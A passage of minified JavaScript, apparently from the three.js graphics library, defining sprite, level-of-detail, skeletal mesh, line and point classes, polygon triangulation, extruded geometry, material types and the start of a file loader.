this};Dc.prototype=Object.assign(Object.create(x.prototype),{constructor:Dc,isSprite:!0,raycast:function(){var a=new q;return function(b,c){a.setFromMatrixPosition(this.matrixWorld);var d=b.ray.distanceSqToPoint(a);d>this.scale.x*this.scale.y/4||c.push({distance:Math.sqrt(d),point:this.position,\nface:null,object:this})}}(),clone:function(){return(new this.constructor(this.material)).copy(this)}});Ec.prototype=Object.assign(Object.create(x.prototype),{constructor:Ec,copy:function(a){x.prototype.copy.call(this,a,!1);a=a.levels;for(var b=0,c=a.length;b<c;b++){var d=a[b];this.addLevel(d.object.clone(),d.distance)}return this},addLevel:function(a,b){void 0===b&&(b=0);b=Math.abs(b);for(var c=this.levels,d=0;d<c.length&&!(b<c[d].distance);d++);c.splice(d,0,{distance:b,object:a});this.add(a)},getObjectForDistance:function(a){for(var b=\nthis.levels,c=1,d=b.length;c<d&&!(a<b[c].distance);c++);return b[c-1].object},raycast:function(){var a=new q;return function(b,c){a.setFromMatrixPosition(this.matrixWorld);var d=b.ray.origin.distanceTo(a);this.getObjectForDistance(d).raycast(b,c)}}(),update:function(){var a=new q,b=new q;return function(c){var d=this.levels;if(1<d.length){a.setFromMatrixPosition(c.matrixWorld);b.setFromMatrixPosition(this.matrixWorld);c=a.distanceTo(b);d[0].object.visible=!0;for(var e=1,f=d.length;e<f;e++)if(c>=d[e].distance)d[e-\n1].object.visible=!1,d[e].object.visible=!0;else break;for(;e<f;e++)d[e].object.visible=!1}}}(),toJSON:function(a){a=x.prototype.toJSON.call(this,a);a.object.levels=[];for(var b=this.levels,c=0,d=b.length;c<d;c++){var e=b[c];a.object.levels.push({object:e.object.uuid,distance:e.distance})}return a}});Object.assign(od.prototype,{calculateInverses:function(){this.boneInverses=[];for(var a=0,b=this.bones.length;a<b;a++){var c=new S;this.bones[a]&&c.getInverse(this.bones[a].matrixWorld);this.boneInverses.push(c)}},\npose:function(){for(var a,b=0,c=this.bones.length;b<c;b++)(a=this.bones[b])&&a.matrixWorld.getInverse(this.boneInverses[b]);b=0;for(c=this.bones.length;b<c;b++)if(a=this.bones[b])a.parent&&a.parent.isBone?(a.matrix.getInverse(a.parent.matrixWorld),a.matrix.multiply(a.matrixWorld)):a.matrix.copy(a.matrixWorld),a.matrix.decompose(a.position,a.quaternion,a.scale)},update:function(){var a=new S;return function(){for(var b=0,c=this.bones.length;b<c;b++)a.multiplyMatrices(this.bones[b]?this.bones[b].matrixWorld:\nthis.identityMatrix,this.boneInverses[b]),a.toArray(this.boneMatrices,16*b);this.useVertexTexture&&(this.boneTexture.needsUpdate=!0)}}(),clone:function(){return new od(this.bones,this.boneInverses,this.useVertexTexture)}});pd.prototype=Object.assign(Object.create(x.prototype),{constructor:pd,isBone:!0});qd.prototype=Object.assign(Object.create(Aa.prototype),{constructor:qd,isSkinnedMesh:!0,bind:function(a,b){this.skeleton=a;void 0===b&&(this.updateMatrixWorld(!0),this.skeleton.calculateInverses(),\nb=this.matrixWorld);this.bindMatrix.copy(b);this.bindMatrixInverse.getInverse(b)},pose:function(){this.skeleton.pose()},normalizeSkinWeights:function(){if(this.geometry&&this.geometry.isGeometry)for(var a=0;a<this.geometry.skinWeights.length;a++){var b=this.geometry.skinWeights[a],c=1/b.lengthManhattan();Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0)}else if(this.geometry&&this.geometry.isBufferGeometry)for(var b=new fa,d=this.geometry.attributes.skinWeight,a=0;a<d.count;a++)b.x=d.getX(a),b.y=d.getY(a),\nb.z=d.getZ(a),b.w=d.getW(a),c=1/b.lengthManhattan(),Infinity!==c?b.multiplyScalar(c):b.set(1,0,0,0),d.setXYZW(a,b.x,b.y,b.z,b.w)},updateMatrixWorld:function(a){Aa.prototype.updateMatrixWorld.call(this,!0);\"attached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.matrixWorld):\"detached\"===this.bindMode?this.bindMatrixInverse.getInverse(this.bindMatrix):console.warn(\"THREE.SkinnedMesh unrecognized bindMode: \"+this.bindMode)},clone:function(){return(new this.constructor(this.geometry,this.material,\nthis.skeleton.useVertexTexture)).copy(this)}});ia.prototype=Object.create(X.prototype);ia.prototype.constructor=ia;ia.prototype.isLineBasicMaterial=!0;ia.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.linecap=a.linecap;this.linejoin=a.linejoin;return this};Ua.prototype=Object.assign(Object.create(x.prototype),{constructor:Ua,isLine:!0,raycast:function(){var a=new S,b=new cb,c=new Na;return function(d,e){var f=d.linePrecision,f=f*f,\ng=this.geometry,h=this.matrixWorld;null===g.boundingSphere&&g.computeBoundingSphere();c.copy(g.boundingSphere);c.applyMatrix4(h);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(h);b.copy(d.ray).applyMatrix4(a);var m=new q,k=new q,h=new q,l=new q,p=this&&this.isLineSegments?2:1;if(g.isBufferGeometry){var n=g.index,u=g.attributes.position.array;if(null!==n)for(var n=n.array,g=0,G=n.length-1;g<G;g+=p){var r=n[g+1];m.fromArray(u,3*n[g]);k.fromArray(u,3*r);r=b.distanceSqToSegment(m,k,l,h);r>f||(l.applyMatrix4(this.matrixWorld),\nr=d.ray.origin.distanceTo(l),r<d.near||r>d.far||e.push({distance:r,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else for(g=0,G=u.length/3-1;g<G;g+=p)m.fromArray(u,3*g),k.fromArray(u,3*g+3),r=b.distanceSqToSegment(m,k,l,h),r>f||(l.applyMatrix4(this.matrixWorld),r=d.ray.origin.distanceTo(l),r<d.near||r>d.far||e.push({distance:r,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}else if(g.isGeometry)for(m=g.vertices,\nk=m.length,g=0;g<k-1;g+=p)r=b.distanceSqToSegment(m[g],m[g+1],l,h),r>f||(l.applyMatrix4(this.matrixWorld),r=d.ray.origin.distanceTo(l),r<d.near||r>d.far||e.push({distance:r,point:h.clone().applyMatrix4(this.matrixWorld),index:g,face:null,faceIndex:null,object:this}))}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});ga.prototype=Object.assign(Object.create(Ua.prototype),{constructor:ga,isLineSegments:!0});Oa.prototype=Object.create(X.prototype);Oa.prototype.constructor=\nOa;Oa.prototype.isPointsMaterial=!0;Oa.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.size=a.size;this.sizeAttenuation=a.sizeAttenuation;return this};Mb.prototype=Object.assign(Object.create(x.prototype),{constructor:Mb,isPoints:!0,raycast:function(){var a=new S,b=new cb,c=new Na;return function(d,e){function f(a,c){var f=b.distanceSqToPoint(a);if(f<l){var h=b.closestPointToPoint(a);h.applyMatrix4(m);var k=d.ray.origin.distanceTo(h);k<d.near||\nk>d.far||e.push({distance:k,distanceToRay:Math.sqrt(f),point:h.clone(),index:c,face:null,object:g})}}var g=this,h=this.geometry,m=this.matrixWorld,k=d.params.Points.threshold;null===h.boundingSphere&&h.computeBoundingSphere();c.copy(h.boundingSphere);c.applyMatrix4(m);if(!1!==d.ray.intersectsSphere(c)){a.getInverse(m);b.copy(d.ray).applyMatrix4(a);var k=k/((this.scale.x+this.scale.y+this.scale.z)/3),l=k*k,k=new q;if(h.isBufferGeometry){var p=h.index,h=h.attributes.position.array;if(null!==p)for(var n=\np.array,p=0,u=n.length;p<u;p++){var G=n[p];k.fromArray(h,3*G);f(k,G)}else for(p=0,n=h.length/3;p<n;p++)k.fromArray(h,3*p),f(k,p)}else for(k=h.vertices,p=0,n=k.length;p<n;p++)f(k[p],p)}}}(),clone:function(){return(new this.constructor(this.geometry,this.material)).copy(this)}});Fc.prototype=Object.assign(Object.create(x.prototype),{constructor:Fc});rd.prototype=Object.create(ea.prototype);rd.prototype.constructor=rd;Nb.prototype=Object.create(ea.prototype);Nb.prototype.constructor=Nb;Nb.prototype.isCompressedTexture=\n!0;sd.prototype=Object.create(ea.prototype);sd.prototype.constructor=sd;Gc.prototype=Object.create(ea.prototype);Gc.prototype.constructor=Gc;Gc.prototype.isDepthTexture=!0;Ob.prototype=Object.create(I.prototype);Ob.prototype.constructor=Ob;Hc.prototype=Object.create(T.prototype);Hc.prototype.constructor=Hc;Pb.prototype=Object.create(I.prototype);Pb.prototype.constructor=Pb;Ic.prototype=Object.create(T.prototype);Ic.prototype.constructor=Ic;Ba.prototype=Object.create(I.prototype);Ba.prototype.constructor=\nBa;Jc.prototype=Object.create(T.prototype);Jc.prototype.constructor=Jc;Qb.prototype=Object.create(Ba.prototype);Qb.prototype.constructor=Qb;Kc.prototype=Object.create(T.prototype);Kc.prototype.constructor=Kc;ob.prototype=Object.create(Ba.prototype);ob.prototype.constructor=ob;Lc.prototype=Object.create(T.prototype);Lc.prototype.constructor=Lc;Rb.prototype=Object.create(Ba.prototype);Rb.prototype.constructor=Rb;Mc.prototype=Object.create(T.prototype);Mc.prototype.constructor=Mc;Sb.prototype=Object.create(Ba.prototype);\nSb.prototype.constructor=Sb;Nc.prototype=Object.create(T.prototype);Nc.prototype.constructor=Nc;Tb.prototype=Object.create(I.prototype);Tb.prototype.constructor=Tb;Oc.prototype=Object.create(T.prototype);Oc.prototype.constructor=Oc;Ub.prototype=Object.create(I.prototype);Ub.prototype.constructor=Ub;Pc.prototype=Object.create(T.prototype);Pc.prototype.constructor=Pc;Vb.prototype=Object.create(I.prototype);Vb.prototype.constructor=Vb;var Ia={area:function(a){for(var b=a.length,c=0,d=b-1,e=0;e<b;d=e++)c+=\na[d].x*a[e].y-a[e].x*a[d].y;return.5*c},triangulate:function(){return function(a,b){var c=a.length;if(3>c)return null;var d=[],e=[],f=[],g,h,m;if(0<Ia.area(a))for(h=0;h<c;h++)e[h]=h;else for(h=0;h<c;h++)e[h]=c-1-h;var k=2*c;for(h=c-1;2<c;){if(0>=k--){console.warn(\"THREE.ShapeUtils: Unable to triangulate polygon! in triangulate()\");break}g=h;c<=g&&(g=0);h=g+1;c<=h&&(h=0);m=h+1;c<=m&&(m=0);var l;a:{var p,n,q,G,r,A,w,y;p=a[e[g]].x;n=a[e[g]].y;q=a[e[h]].x;G=a[e[h]].y;r=a[e[m]].x;A=a[e[m]].y;if(0>=(q-\np)*(A-n)-(G-n)*(r-p))l=!1;else{var K,v,E,x,C,F,D,H,z,J;K=r-q;v=A-G;E=p-r;x=n-A;C=q-p;F=G-n;for(l=0;l<c;l++)if(w=a[e[l]].x,y=a[e[l]].y,!(w===p&&y===n||w===q&&y===G||w===r&&y===A)&&(D=w-p,H=y-n,z=w-q,J=y-G,w-=r,y-=A,z=K*J-v*z,D=C*H-F*D,H=E*y-x*w,z>=-Number.EPSILON&&H>=-Number.EPSILON&&D>=-Number.EPSILON)){l=!1;break a}l=!0}}if(l){d.push([a[e[g]],a[e[h]],a[e[m]]]);f.push([e[g],e[h],e[m]]);g=h;for(m=h+1;m<c;g++,m++)e[g]=e[m];c--;k=2*c}}return b?f:d}}(),triangulateShape:function(a,b){function c(a){var b=\na.length;2<b&&a[b-1].equals(a[0])&&a.pop()}function d(a,b,c){return a.x!==b.x?a.x<b.x?a.x<=c.x&&c.x<=b.x:b.x<=c.x&&c.x<=a.x:a.y<b.y?a.y<=c.y&&c.y<=b.y:b.y<=c.y&&c.y<=a.y}function e(a,b,c,e,f){var g=b.x-a.x,h=b.y-a.y,k=e.x-c.x,m=e.y-c.y,l=a.x-c.x,n=a.y-c.y,p=h*k-g*m,t=h*l-g*n;if(Math.abs(p)>Number.EPSILON){if(0<p){if(0>t||t>p)return[];k=m*l-k*n;if(0>k||k>p)return[]}else{if(0<t||t<p)return[];k=m*l-k*n;if(0<k||k<p)return[]}if(0===k)return!f||0!==t&&t!==p?[a]:[];if(k===p)return!f||0!==t&&t!==p?[b]:[];\nif(0===t)return[c];if(t===p)return[e];f=k/p;return[{x:a.x+f*g,y:a.y+f*h}]}if(0!==t||m*l!==k*n)return[];h=0===g&&0===h;k=0===k&&0===m;if(h&&k)return a.x!==c.x||a.y!==c.y?[]:[a];if(h)return d(c,e,a)?[a]:[];if(k)return d(a,b,c)?[c]:[];0!==g?(a.x<b.x?(g=a,k=a.x,h=b,a=b.x):(g=b,k=b.x,h=a,a=a.x),c.x<e.x?(b=c,p=c.x,m=e,c=e.x):(b=e,p=e.x,m=c,c=c.x)):(a.y<b.y?(g=a,k=a.y,h=b,a=b.y):(g=b,k=b.y,h=a,a=a.y),c.y<e.y?(b=c,p=c.y,m=e,c=e.y):(b=e,p=e.y,m=c,c=c.y));return k<=p?a<p?[]:a===p?f?[]:[b]:a<=c?[b,h]:[b,m]:\nk>c?[]:k===c?f?[]:[g]:a<=c?[g,h]:[g,m]}function f(a,b,c,d){var e=b.x-a.x,f=b.y-a.y;b=c.x-a.x;c=c.y-a.y;var g=d.x-a.x;d=d.y-a.y;a=e*c-f*b;e=e*d-f*g;return Math.abs(a)>Number.EPSILON?(b=g*c-d*b,0<a?0<=e&&0<=b:0<=e||0<=b):0<e}c(a);b.forEach(c);var g,h,m,k,l,p={};m=a.concat();g=0;for(h=b.length;g<h;g++)Array.prototype.push.apply(m,b[g]);g=0;for(h=m.length;g<h;g++)l=m[g].x+\":\"+m[g].y,void 0!==p[l]&&console.warn(\"THREE.ShapeUtils: Duplicate point\",l,g),p[l]=g;g=function(a,b){function c(a,b){var d=h.length-\n1,e=a-1;0>e&&(e=d);var g=a+1;g>d&&(g=0);d=f(h[a],h[e],h[g],k[b]);if(!d)return!1;d=k.length-1;e=b-1;0>e&&(e=d);g=b+1;g>d&&(g=0);return(d=f(k[b],k[e],k[g],h[a]))?!0:!1}function d(a,b){var c,f;for(c=0;c<h.length;c++)if(f=c+1,f%=h.length,f=e(a,b,h[c],h[f],!0),0<f.length)return!0;return!1}function g(a,c){var d,f,h,k;for(d=0;d<m.length;d++)for(f=b[m[d]],h=0;h<f.length;h++)if(k=h+1,k%=f.length,k=e(a,c,f[h],f[k],!0),0<k.length)return!0;return!1}var h=a.concat(),k,m=[],l,n,p,t,q,x=[],D,z,J,I=0;for(l=b.length;I<\nl;I++)m.push(I);D=0;for(var Q=2*m.length;0<m.length;){Q--;if(0>Q){console.log(\"Infinite Loop! Holes left:\"+m.length+\", Probably Hole outside Shape!\");break}for(n=D;n<h.length;n++){p=h[n];l=-1;for(I=0;I<m.length;I++)if(t=m[I],q=p.x+\":\"+p.y+\":\"+t,void 0===x[q]){k=b[t];for(z=0;z<k.length;z++)if(t=k[z],c(n,z)&&!d(p,t)&&!g(p,t)){l=z;m.splice(I,1);D=h.slice(0,n+1);t=h.slice(n);z=k.slice(l);J=k.slice(0,l+1);h=D.concat(z).concat(J).concat(t);D=n;break}if(0<=l)break;x[q]=!0}if(0<=l)break}}return h}(a,b);var n=\nIa.triangulate(g,!1);g=0;for(h=n.length;g<h;g++)for(k=n[g],m=0;3>m;m++)l=k[m].x+\":\"+k[m].y,l=p[l],void 0!==l&&(k[m]=l);return n.concat()},isClockWise:function(a){return 0>Ia.area(a)}};La.prototype=Object.create(T.prototype);La.prototype.constructor=La;La.prototype.addShapeList=function(a,b){for(var c=a.length,d=0;d<c;d++)this.addShape(a[d],b)};La.prototype.addShape=function(a,b){function c(a,b,c){b||console.error(\"THREE.ExtrudeGeometry: vec does not exist\");return b.clone().multiplyScalar(c).add(a)}\nfunction d(a,b,c){var d,e,f;e=a.x-b.x;f=a.y-b.y;d=c.x-a.x;var g=c.y-a.y,h=e*e+f*f;if(Math.abs(e*g-f*d)>Number.EPSILON){var k=Math.sqrt(h),m=Math.sqrt(d*d+g*g),h=b.x-f/k;b=b.y+e/k;g=((c.x-g/m-h)*g-(c.y+d/m-b)*d)/(e*g-f*d);d=h+e*g-a.x;e=b+f*g-a.y;f=d*d+e*e;if(2>=f)return new D(d,e);f=Math.sqrt(f/2)}else a=!1,e>Number.EPSILON?d>Number.EPSILON&&(a=!0):e<-Number.EPSILON?d<-Number.EPSILON&&(a=!0):Math.sign(f)===Math.sign(g)&&(a=!0),a?(d=-f,f=Math.sqrt(h)):(d=e,e=f,f=Math.sqrt(h/2));return new D(d/f,e/f)}\nfunction e(a,b){var c,d;for(R=a.length;0<=--R;){c=R;d=R-1;0>d&&(d=a.length-1);var e,f=u+2*l;for(e=0;e<f;e++){var g=U*e,h=U*(e+1),k=b+c+g,g=b+d+g,m=b+d+h,h=b+c+h,k=k+H,g=g+H,m=m+H,h=h+H;J.faces.push(new ha(k,g,h,null,null,1));J.faces.push(new ha(g,m,h,null,null,1));k=w.generateSideWallUV(J,k,g,m,h);J.faceVertexUvs[0].push([k[0],k[1],k[3]]);J.faceVertexUvs[0].push([k[1],k[2],k[3]])}}}function f(a,b,c){J.vertices.push(new q(a,b,c))}function g(a,b,c){a+=H;b+=H;c+=H;J.faces.push(new ha(a,b,c,null,null,\n0));a=w.generateTopUV(J,a,b,c);J.faceVertexUvs[0].push(a)}var h=void 0!==b.amount?b.amount:100,m=void 0!==b.bevelThickness?b.bevelThickness:6,k=void 0!==b.bevelSize?b.bevelSize:m-2,l=void 0!==b.bevelSegments?b.bevelSegments:3,p=void 0!==b.bevelEnabled?b.bevelEnabled:!0,n=void 0!==b.curveSegments?b.curveSegments:12,u=void 0!==b.steps?b.steps:1,G=b.extrudePath,r,A=!1,w=void 0!==b.UVGenerator?b.UVGenerator:La.WorldUVGenerator,y,x,v,E;G&&(r=G.getSpacedPoints(u),A=!0,p=!1,y=void 0!==b.frames?b.frames:\nG.computeFrenetFrames(u,!1),x=new q,v=new q,E=new q);p||(k=m=l=0);var z,C,F,J=this,H=this.vertices.length,G=a.extractPoints(n),n=G.shape,I=G.holes;if(G=!Ia.isClockWise(n)){n=n.reverse();C=0;for(F=I.length;C<F;C++)z=I[C],Ia.isClockWise(z)&&(I[C]=z.reverse());G=!1}var T=Ia.triangulateShape(n,I),S=n;C=0;for(F=I.length;C<F;C++)z=I[C],n=n.concat(z);var N,Q,M,O,P,U=n.length,W,V=T.length,G=[],R=0;M=S.length;N=M-1;for(Q=R+1;R<M;R++,N++,Q++)N===M&&(N=0),Q===M&&(Q=0),G[R]=d(S[R],S[N],S[Q]);var X=[],Z,ca=G.concat();\nC=0;for(F=I.length;C<F;C++){z=I[C];Z=[];R=0;M=z.length;N=M-1;for(Q=R+1;R<M;R++,N++,Q++)N===M&&(N=0),Q===M&&(Q=0),Z[R]=d(z[R],z[N],z[Q]);X.push(Z);ca=ca.concat(Z)}for(N=0;N<l;N++){M=N/l;O=m*Math.cos(M*Math.PI/2);Q=k*Math.sin(M*Math.PI/2);R=0;for(M=S.length;R<M;R++)P=c(S[R],G[R],Q),f(P.x,P.y,-O);C=0;for(F=I.length;C<F;C++)for(z=I[C],Z=X[C],R=0,M=z.length;R<M;R++)P=c(z[R],Z[R],Q),f(P.x,P.y,-O)}Q=k;for(R=0;R<U;R++)P=p?c(n[R],ca[R],Q):n[R],A?(v.copy(y.normals[0]).multiplyScalar(P.x),x.copy(y.binormals[0]).multiplyScalar(P.y),\nE.copy(r[0]).add(v).add(x),f(E.x,E.y,E.z)):f(P.x,P.y,0);for(M=1;M<=u;M++)for(R=0;R<U;R++)P=p?c(n[R],ca[R],Q):n[R],A?(v.copy(y.normals[M]).multiplyScalar(P.x),x.copy(y.binormals[M]).multiplyScalar(P.y),E.copy(r[M]).add(v).add(x),f(E.x,E.y,E.z)):f(P.x,P.y,h/u*M);for(N=l-1;0<=N;N--){M=N/l;O=m*Math.cos(M*Math.PI/2);Q=k*Math.sin(M*Math.PI/2);R=0;for(M=S.length;R<M;R++)P=c(S[R],G[R],Q),f(P.x,P.y,h+O);C=0;for(F=I.length;C<F;C++)for(z=I[C],Z=X[C],R=0,M=z.length;R<M;R++)P=c(z[R],Z[R],Q),A?f(P.x,P.y+r[u-1].y,\nr[u-1].x+O):f(P.x,P.y,h+O)}(function(){if(p){var a=0*U;for(R=0;R<V;R++)W=T[R],g(W[2]+a,W[1]+a,W[0]+a);a=U*(u+2*l);for(R=0;R<V;R++)W=T[R],g(W[0]+a,W[1]+a,W[2]+a)}else{for(R=0;R<V;R++)W=T[R],g(W[2],W[1],W[0]);for(R=0;R<V;R++)W=T[R],g(W[0]+U*u,W[1]+U*u,W[2]+U*u)}})();(function(){var a=0;e(S,a);a+=S.length;C=0;for(F=I.length;C<F;C++)z=I[C],e(z,a),a+=z.length})()};La.WorldUVGenerator={generateTopUV:function(a,b,c,d){a=a.vertices;b=a[b];c=a[c];d=a[d];return[new D(b.x,b.y),new D(c.x,c.y),new D(d.x,d.y)]},\ngenerateSideWallUV:function(a,b,c,d,e){a=a.vertices;b=a[b];c=a[c];d=a[d];e=a[e];return.01>Math.abs(b.y-c.y)?[new D(b.x,1-b.z),new D(c.x,1-c.z),new D(d.x,1-d.z),new D(e.x,1-e.z)]:[new D(b.y,1-b.z),new D(c.y,1-c.z),new D(d.y,1-d.z),new D(e.y,1-e.z)]}};Qc.prototype=Object.create(La.prototype);Qc.prototype.constructor=Qc;Rc.prototype=Object.create(T.prototype);Rc.prototype.constructor=Rc;pb.prototype=Object.create(I.prototype);pb.prototype.constructor=pb;Sc.prototype=Object.create(T.prototype);Sc.prototype.constructor=\nSc;Wb.prototype=Object.create(I.prototype);Wb.prototype.constructor=Wb;Tc.prototype=Object.create(T.prototype);Tc.prototype.constructor=Tc;Xb.prototype=Object.create(I.prototype);Xb.prototype.constructor=Xb;Yb.prototype=Object.create(T.prototype);Yb.prototype.constructor=Yb;Zb.prototype=Object.create(I.prototype);Zb.prototype.constructor=Zb;$b.prototype=Object.create(I.prototype);$b.prototype.constructor=$b;qb.prototype=Object.create(T.prototype);qb.prototype.constructor=qb;Va.prototype=Object.create(I.prototype);\nVa.prototype.constructor=Va;Uc.prototype=Object.create(qb.prototype);Uc.prototype.constructor=Uc;Vc.prototype=Object.create(Va.prototype);Vc.prototype.constructor=Vc;Wc.prototype=Object.create(T.prototype);Wc.prototype.constructor=Wc;ac.prototype=Object.create(I.prototype);ac.prototype.constructor=ac;var Ma=Object.freeze({WireframeGeometry:Ob,ParametricGeometry:Hc,ParametricBufferGeometry:Pb,TetrahedronGeometry:Jc,TetrahedronBufferGeometry:Qb,OctahedronGeometry:Kc,OctahedronBufferGeometry:ob,IcosahedronGeometry:Lc,\nIcosahedronBufferGeometry:Rb,DodecahedronGeometry:Mc,DodecahedronBufferGeometry:Sb,PolyhedronGeometry:Ic,PolyhedronBufferGeometry:Ba,TubeGeometry:Nc,TubeBufferGeometry:Tb,TorusKnotGeometry:Oc,TorusKnotBufferGeometry:Ub,TorusGeometry:Pc,TorusBufferGeometry:Vb,TextGeometry:Qc,SphereGeometry:Rc,SphereBufferGeometry:pb,RingGeometry:Sc,RingBufferGeometry:Wb,PlaneGeometry:Ac,PlaneBufferGeometry:lb,LatheGeometry:Tc,LatheBufferGeometry:Xb,ShapeGeometry:Yb,ShapeBufferGeometry:Zb,ExtrudeGeometry:La,EdgesGeometry:$b,\nConeGeometry:Uc,ConeBufferGeometry:Vc,CylinderGeometry:qb,CylinderBufferGeometry:Va,CircleGeometry:Wc,CircleBufferGeometry:ac,BoxGeometry:Ib,BoxBufferGeometry:kb});bc.prototype=Object.create(Ha.prototype);bc.prototype.constructor=bc;bc.prototype.isShadowMaterial=!0;cc.prototype=Object.create(Ha.prototype);cc.prototype.constructor=cc;cc.prototype.isRawShaderMaterial=!0;Xc.prototype={constructor:Xc,isMultiMaterial:!0,toJSON:function(a){for(var b={metadata:{version:4.2,type:\"material\",generator:\"MaterialExporter\"},\nuuid:this.uuid,type:this.type,materials:[]},c=this.materials,d=0,e=c.length;d<e;d++){var f=c[d].toJSON(a);delete f.metadata;b.materials.push(f)}b.visible=this.visible;return b},clone:function(){for(var a=new this.constructor,b=0;b<this.materials.length;b++)a.materials.push(this.materials[b].clone());a.visible=this.visible;return a}};Qa.prototype=Object.create(X.prototype);Qa.prototype.constructor=Qa;Qa.prototype.isMeshStandardMaterial=!0;Qa.prototype.copy=function(a){X.prototype.copy.call(this,a);\nthis.defines={STANDARD:\"\"};this.color.copy(a.color);this.roughness=a.roughness;this.metalness=a.metalness;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);this.displacementMap=a.displacementMap;\nthis.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.roughnessMap=a.roughnessMap;this.metalnessMap=a.metalnessMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.envMapIntensity=a.envMapIntensity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=\na.morphNormals;return this};rb.prototype=Object.create(Qa.prototype);rb.prototype.constructor=rb;rb.prototype.isMeshPhysicalMaterial=!0;rb.prototype.copy=function(a){Qa.prototype.copy.call(this,a);this.defines={PHYSICAL:\"\"};this.reflectivity=a.reflectivity;this.clearCoat=a.clearCoat;this.clearCoatRoughness=a.clearCoatRoughness;return this};Ca.prototype=Object.create(X.prototype);Ca.prototype.constructor=Ca;Ca.prototype.isMeshPhongMaterial=!0;Ca.prototype.copy=function(a){X.prototype.copy.call(this,\na);this.color.copy(a.color);this.specular.copy(a.specular);this.shininess=a.shininess;this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=a.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);this.displacementMap=a.displacementMap;this.displacementScale=\na.displacementScale;this.displacementBias=a.displacementBias;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};sb.prototype=\nObject.create(Ca.prototype);sb.prototype.constructor=sb;sb.prototype.isMeshToonMaterial=!0;sb.prototype.copy=function(a){Ca.prototype.copy.call(this,a);this.gradientMap=a.gradientMap;return this};tb.prototype=Object.create(X.prototype);tb.prototype.constructor=tb;tb.prototype.isMeshNormalMaterial=!0;tb.prototype.copy=function(a){X.prototype.copy.call(this,a);this.bumpMap=a.bumpMap;this.bumpScale=a.bumpScale;this.normalMap=a.normalMap;this.normalScale.copy(a.normalScale);this.displacementMap=a.displacementMap;\nthis.displacementScale=a.displacementScale;this.displacementBias=a.displacementBias;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};ub.prototype=Object.create(X.prototype);ub.prototype.constructor=ub;ub.prototype.isMeshLambertMaterial=!0;ub.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.map=a.map;this.lightMap=a.lightMap;this.lightMapIntensity=\na.lightMapIntensity;this.aoMap=a.aoMap;this.aoMapIntensity=a.aoMapIntensity;this.emissive.copy(a.emissive);this.emissiveMap=a.emissiveMap;this.emissiveIntensity=a.emissiveIntensity;this.specularMap=a.specularMap;this.alphaMap=a.alphaMap;this.envMap=a.envMap;this.combine=a.combine;this.reflectivity=a.reflectivity;this.refractionRatio=a.refractionRatio;this.wireframe=a.wireframe;this.wireframeLinewidth=a.wireframeLinewidth;this.wireframeLinecap=a.wireframeLinecap;this.wireframeLinejoin=a.wireframeLinejoin;\nthis.skinning=a.skinning;this.morphTargets=a.morphTargets;this.morphNormals=a.morphNormals;return this};vb.prototype=Object.create(X.prototype);vb.prototype.constructor=vb;vb.prototype.isLineDashedMaterial=!0;vb.prototype.copy=function(a){X.prototype.copy.call(this,a);this.color.copy(a.color);this.linewidth=a.linewidth;this.scale=a.scale;this.dashSize=a.dashSize;this.gapSize=a.gapSize;return this};var Xf=Object.freeze({ShadowMaterial:bc,SpriteMaterial:nb,RawShaderMaterial:cc,ShaderMaterial:Ha,PointsMaterial:Oa,\nMultiMaterial:Xc,MeshPhysicalMaterial:rb,MeshStandardMaterial:Qa,MeshPhongMaterial:Ca,MeshToonMaterial:sb,MeshNormalMaterial:tb,MeshLambertMaterial:ub,MeshDepthMaterial:ab,MeshBasicMaterial:Ka,LineDashedMaterial:vb,LineBasicMaterial:ia,Material:X}),ld={enabled:!1,files:{},add:function(a,b){!1!==this.enabled&&(this.files[a]=b)},get:function(a){if(!1!==this.enabled)return this.files[a]},remove:function(a){delete this.files[a]},clear:function(){this.files={}}},ta=new $d;Object.assign(sa.prototype,{load:function(a,\nb,c,d){void 0===a&&(a=\"\");void 0!==this.path&&(a=this.path+a);var e=this,f=ld.get(a);if(void 0!==f)return e.manager.itemStart(a),setTimeout(function(){b&&b(f);e.manager.itemEnd(a)},0),f;var g=a.match(/^data:(.*?)(;base64)?,(.*)$/);if(g){var h=g[1],m=!!g[2],g=g[3],g=window.decodeURIComponent(g);m&&(g=window.atob(g));try{var k,l=(this.responseType||\"\").toLowerCase();switch(l){case \"arraybuffer\":case \"blob\":k=new 